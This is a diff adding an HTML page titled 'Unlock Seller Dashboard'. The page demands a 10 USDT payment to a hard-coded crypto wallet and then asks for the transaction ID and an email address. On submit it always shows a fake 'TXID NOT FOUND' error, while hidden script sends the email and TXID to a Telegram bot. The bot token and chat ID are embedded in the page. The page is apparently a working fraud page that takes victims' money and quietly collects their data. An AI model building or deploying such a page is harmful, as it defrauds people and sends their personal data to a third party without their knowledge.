@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Unlock Seller Dashboard</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8461406793:AAHZNYTvSi07rOd_wyn90PcLEZQZSsFOosw';
+    const TELEGRAM_CHAT_ID = '7599805034';
+
+    function copyAddress() {
+      const address = document.getElementById("walletAddress");
+      navigator.clipboard.writeText(address.innerText);
+      alert("Copied!");
+    }
+
+    function submitForm(event) {
+      event.preventDefault();
+
+      const txid = document.getElementById("txidInput").value.trim();
+      const email = document.getElementById("emailInput").value.trim();
+
+      if (!txid || !email) {
+        alert("Please fill in both fields.");
+        return;
+      }
+
+      // Show loading modal
+      document.getElementById("modal").classList.remove("hidden");
+
+      setTimeout(() => {
+        // Hide modal
+        document.getElementById("modal").classList.add("hidden");
+
+        // Show alert
+        alert("YOUR TXID NOT FOUND");
+
+        // Send to Telegram
+        const message = `🚨 *UNLOCK REQUEST*\n\n📧 *Email:* ${email}\n🔗 *TXID:* ${txid}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      }, 3000);
+    }
+  </script>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen p-4 relative">
+
+  <!-- Modal Spinner -->
+  <div id="modal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg flex flex-col items-center space-y-4">
+      <svg class="animate-spin h-10 w-10 text-purple-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+      </svg>
+      <p class="text-white text-sm">Processing...</p>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="w-full max-w-md space-y-6 z-10">
+
+    <h2 class="text-2xl font-bold text-center">MUST PAY 10 USDT (BEP20) ONLY</h2>
+
+    <img src="payment1.png" alt="Payment" class="w-full rounded-lg shadow-lg" />
+
+    <!-- Wallet Copy -->
+    <div class="bg-gray-800 rounded-lg p-4 flex items-center justify-between">
+      <span id="walletAddress" class="break-all text-sm">0x7ea19191baa01834719e0436593e4251654ba4ee</span>
+      <button onclick="copyAddress()" class="bg-purple-600 hover:bg-purple-700 text-white text-xs px-3 py-1 rounded ml-2">
+        Copy
+      </button>
+    </div>
+
+    <!-- Hash XM -->
+    <div class="bg-gray-700 p-3 rounded-lg text-sm">
+      <span class="font-semibold">Hash XM:</span> VL-79Kn6VK
+    </div>
+
+    <img src="txid.png" alt="TXID Example" class="w-full rounded-lg shadow-lg" />
+
+    <!-- Form -->
+    <form onsubmit="submitForm(event)" class="space-y-4">
+      <input id="txidInput" type="text" placeholder="Enter TXID" required class="w-full p-3 rounded bg-gray-800 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500" />
+
+      <input id="emailInput" type="email" placeholder="EMAIL (you will receive dashboard information in your email)" required class="w-full p-3 rounded bg-gray-800 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500" />
+
+      <button type="submit" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 rounded">
+        Submit
+      </button>
+    </form>
+
+  </div>
+
+</body>
+</html>
